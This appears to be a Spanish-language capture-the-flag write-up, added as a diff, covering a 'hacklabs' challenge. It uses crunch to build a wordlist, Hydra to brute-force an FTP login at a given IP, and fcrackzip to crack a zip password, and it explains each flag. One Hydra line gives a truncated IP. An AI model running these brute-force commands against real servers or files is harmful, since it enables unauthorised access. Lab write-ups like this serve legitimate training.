@@ -1,0 +1,43 @@
+# Aqui mostrare y explicare los comandos que he utilizado para realizar el primer Reto de "hacklabs"
+
+# Autor: Ivan
+# Creditos: https://www.youtube.com/watch?v=QXOg_fC_Iew&t=284s
+
+# Herramientas
+ - Hydra (Para hacer el test de fuerza bruta)
+ - crunch (Para generar el fichero de contraseñas)
+ - ftp (Para conectarme al sevidor ftp)
+
+# Procedimiento
+# En el enunciado del reto se nos proporciona una cuenta de facebook de la cual si analizamos una de las imagenes 
+# se nos dice que el servidor tiene la ip: 52.10.103.130 y que su usuario es: aquero.
+# Luego en otra de las imagenes de la cuenta aparecen las politicas para la creacion de las contraseñas del servidor
+# FTP
+
+# Sabiendo esto podemos crear un fichero con el comando crunch con todas las posibles convinaciones:
+crunch 7 7 0123456789 -o crunch.txt
+crunch <min_len> <max_len> <valores_a_combinar> -o(especificar el fichero) <nombre/ruta_fichero>
+
+# Con el fichero creado y sabiendo el usuario mediante hydra hacemos el test de fuerza bruta
+hydra -l aquero -P crunch.txt ftp://52.10.103.13
+hydra -l(user_login) <user.login> -P(especificar_fichero) <nombre_fichero> <servidor_a_atacar>
+# En mi caso a tardado un buen rato ya que estoy en una maquina virtual
+
+# Una vez obtenida la contraseña mediante ftp nos conectamos al servidor
+ftp -p 52.10.103.130
+# Le das el nombre y la contraseña
+
+# Asi de facil :)
+
+# Luego si quieres añadir un fichero como dice el reto, pues desde fuera del server creas uno y una vez en el servidor
+# haces:
+# mi fichero se llama loConsegui.txt
+put <nombre_fichero>
+# Asi creas el fichero dentro (hay que ser rapido que la conexion se cierra en 1-2 minutos)
+
+# Hasta ahora nos hemos conectado pero tambien queremos el nuevo dron que nos dice el ejercicio por lo que desde
+# la url del repositorio buscamos privado "http://labs.gf0s.com/website/privado/"
+# Una vez encontrado nos bajamos el zip y lo descomprimimos con unzip (tiene pwd asi que no nos deja) por lo que utilizaremos:
+fcrackzip -b -c a1 -l 6-6 -v -u PrototipoPrivado6.zip
+fcrackzip -b(brute-force) -c(caracter-set) a1(alfanumeric) -l(lenght) <min>-<max> -v(verbose?) -u(unzip-for-wrong-pwd)
+
